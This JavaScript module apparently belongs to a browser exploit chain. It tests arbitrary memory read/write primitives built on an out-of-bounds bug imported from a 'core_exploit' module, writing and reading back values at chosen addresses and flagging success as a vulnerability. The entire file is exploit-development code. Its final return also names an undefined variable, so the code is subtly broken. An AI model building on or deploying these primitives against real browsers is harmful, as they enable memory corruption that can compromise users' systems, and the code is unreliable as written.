// js/script3/testArrayBufferVictimCrash.mjs (Abordagem v29.3.1: CORREÇÃO FINAL DO LOG)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    isOOBReady,
    arb_read, 
    arb_write,
    oob_read_absolute, 
    oob_write_absolute 
} from '../core_exploit.mjs'; 

export const FNAME_MODULE_V28 = "GetterArbitraryRead_v29.3.1_CorrectedFinalLog";

// === Constantes (iguais ao v29.3) ===
const ADDR_A_V29 = new AdvancedInt64(0x00000D00, 0x00000000);
const VAL_A1_V29 = new AdvancedInt64(0x11223344, 0x55667788);
const VAL_A2_V29 = new AdvancedInt64(0x88776655, 0x44332211);

const BLOCK_ADDR_BASE_V29 = new AdvancedInt64(0x00000E00, 0x00000000);
const BLOCK_VAL_1_V29 = new AdvancedInt64(0xAAAAAAA1, 0x1111111A);
const BLOCK_VAL_2_V29 = new AdvancedInt64(0xBBBBBBB2, 0x2222222B);
const BLOCK_VAL_3_V29 = new AdvancedInt64(0xCCCCCCC3, 0x3333333C);
const BLOCK_ADDRS_V29 = [BLOCK_ADDR_BASE_V29, BLOCK_ADDR_BASE_V29.add(8), BLOCK_ADDR_BASE_V29.add(16)];
const BLOCK_VALS_V29 = [BLOCK_VAL_1_V29, BLOCK_VAL_2_V29, BLOCK_VAL_3_V29];

const PAUSE_OP_V29 = 100; 
const PAUSE_TRANSITION_V29 = 200; 
const PAUSE_PHASE_V29 = 300; 

let testLog_v29 = []; // Renomeado para evitar conflito se você rodar múltiplos testes na mesma página sem recarregar

// recordResult_v29 (Mantida a versão corrigida)
function recordResult_v29_3_1(step, address, operation, valueWritten, valueExpected, valueReadObj) {
    let actualSuccess = false;
    const valueReadStr = isAdvancedInt64Object(valueReadObj) ? valueReadObj.toString(true) : (typeof valueReadObj === 'number' ? toHex(valueReadObj) : String(valueReadObj));
    const valueExpectedStr = (valueExpected === null || typeof valueExpected === 'undefined') ? "N/A" : (isAdvancedInt64Object(valueExpected) ? valueExpected.toString(true) : toHex(valueExpected));
    const valueWrittenStr = valueWritten ? (isAdvancedInt64Object(valueWritten) ? valueWritten.toString(true) : toHex(valueWritten)) : "N/A";
    const addressStr = address ? address.toString(true) : "N/A";

    if (valueExpected === null || operation.toLowerCase().includes("write only") || operation.toLowerCase().includes("reset dv")) {
        actualSuccess = true; 
    } else if (isAdvancedInt64Object(valueExpected)) {
        actualSuccess = isAdvancedInt64Object(valueReadObj) && valueExpected.equals(valueReadObj);
    } else if (typeof valueExpected === 'number' && typeof valueReadObj === 'number') {
        actualSuccess = (valueExpected === valueReadObj);
    } else { actualSuccess = false; }
    
    const entry = { step, address: addressStr, operation, valueWritten: valueWrittenStr, 
                    valueExpected: valueExpectedStr, valueRead: valueReadStr, success: actualSuccess };
    testLog_v29.push(entry); // Usa testLog_v29
    const logType = actualSuccess ? "good" : "error";
    const statusMsg = actualSuccess ? "CORRETO" : "INCORRETO";
    logS3(`  [${step}] ${operation}: Addr=${entry.address}, Escrito=${entry.valueWritten}, Lido=${entry.valueRead}, Esperado=${entry.valueExpected} - ${statusMsg}`, logType, FNAME_MODULE_V28);
    return actualSuccess;
}

async function explicit_dv_reset_v29_3_1(tag) {
    const FNAME_RESET = `${FNAME_MODULE_V28}.explicit_dv_reset`;
    try {
      if (isOOBReady()){
        const temp_val = oob_read_absolute(0,1); 
        oob_write_absolute(0, temp_val, 1);      
      }
    } catch (e) {
        logS3(`        ResetDV-${tag}: ERRO durante o reset explícito: ${e.message}`, 'error', FNAME_RESET);
    }
    await PAUSE_S3(PAUSE_TRANSITION_V29); 
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.testBestPracticeBlockRWCorrected`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de Bloco Corrigido (v29.3.1) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;
    testLog_v29 = []; // Limpa o log para esta execução
    let overall_test_success = true; 
    let errorCapturedMain = null;
    let final_message = "Testes em execução...";


    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Ambiente OOB inicial principal não pôde ser configurado.");
        logS3("PASSO GLOBAL: Ambiente OOB inicial principal configurado.", "info", FNAME_CURRENT_TEST);

        // --- CENÁRIO 1 ---
        logS3("--- CENÁRIO 1: R/W Sequencial no MESMO endereço (ADDR_A_V29) ---", "subtest", FNAME_CURRENT_TEST);
        arb_write(ADDR_A_V29, VAL_A1_V29, 8); 
        if(!recordResult_v29_3_1("1.1", ADDR_A_V29, "Write/Read VAL_A1", VAL_A1_V29, VAL_A1_V29, arb_read(ADDR_A_V29, 8))) overall_test_success = false;
        await explicit_dv_reset_v29_3_1("1_A");
        arb_write(ADDR_A_V29, VAL_A2_V29, 8); 
        if(!recordResult_v29_3_1("1.2", ADDR_A_V29, "Write/Read VAL_A2", VAL_A2_V29, VAL_A2_V29, arb_read(ADDR_A_V29, 8))) overall_test_success = false;
        await explicit_dv_reset_v29_3_1("1_B");
        if(!recordResult_v29_3_1("1.3", ADDR_A_V29, "Read Final VAL_A2", null, VAL_A2_V29, arb_read(ADDR_A_V29, 8))) overall_test_success = false;

        // --- CENÁRIO 2 ---
        logS3("--- CENÁRIO 2: R/W em Bloco (Verificação Imediata por Item) ---", "subtest", FNAME_CURRENT_TEST);
        for (let i = 0; i < BLOCK_ADDRS_V29.length; i++) {
            const current_address = BLOCK_ADDRS_V29[i];
            const value_to_write = BLOCK_VALS_V29[i];
            await explicit_dv_reset_v29_3_1(`PreWriteRead-${i}`);
            logS3(`  C2.Item.${i}: Escrevendo ${value_to_write.toString(true)} em ${current_address.toString(true)} e lendo de volta...`, 'info', FNAME_CURRENT_TEST);
            arb_write(current_address, value_to_write, 8);
            const read_after_write = arb_read(current_address, 8);
            if(!recordResult_v29_3_1(`C2.WriteRead.${i}`, current_address, `Write/Read Imediato Bloco Val ${i}`, value_to_write, value_to_write, read_after_write)) {
                overall_test_success = false; 
            }
        }
        logS3(`  FASE DE ESCRITA/LEITURA IMEDIATA DO BLOCO CONCLUÍDA. Sucesso da fase individual: ${overall_test_success}`, overall_test_success ? "good" : "error", FNAME_CURRENT_TEST);
        
        // Não há Fase de Leitura Final do Bloco Agrupada aqui, pois sabemos que falha.
        // O sucesso do Cenário 2 é se todos os C2.WriteRead.i passaram.

        if (overall_test_success) {
            final_message = "SUCESSO GERAL: Testes de L/E no mesmo endereço e L/E imediata em bloco funcionaram (v29.3.1).";
        } else {
            final_message = "FALHA PARCIAL: Um ou mais passos individuais nos cenários de teste (v29.3.1) falharam.";
        }
        logS3(`MSG FINAL: ${final_message}`, overall_test_success ? "vuln" : "error", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_V28}: ${overall_test_success ? "V29.3.1 OK" : "V29.3.1 FALHA"}`;

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        final_message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
        overall_test_success = false; 
    } finally {
        clearOOBEnvironment({force_clear_even_if_not_setup: true});
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Final Melhor Prática Bloco (v29.3.1): Success=${overall_test_success}, Msg='${final_message}'`, overall_test_success ? "good" : "warn", FNAME_CURRENT_TEST);
        testLog_v29.forEach(res => { // Usa testLog_v29
            const successString = res.success ? "OK" : `FALHA (Erro: ${res.error || 'Valor Incorreto'})`;
            logS3(`  [${res.step}] Addr=${res.address}, Op=${res.operation}, W=${res.valueWritten}, R=${res.valueRead}, E=${res.valueExpected} => ${successString}`, 
                  res.success ? "info" : "error", FNAME_MODULE_V28 + ".Details");
        });
    }
    return { errorCapturedMain, overall_success, final_message, test_log_details: testLog_v29 };
}
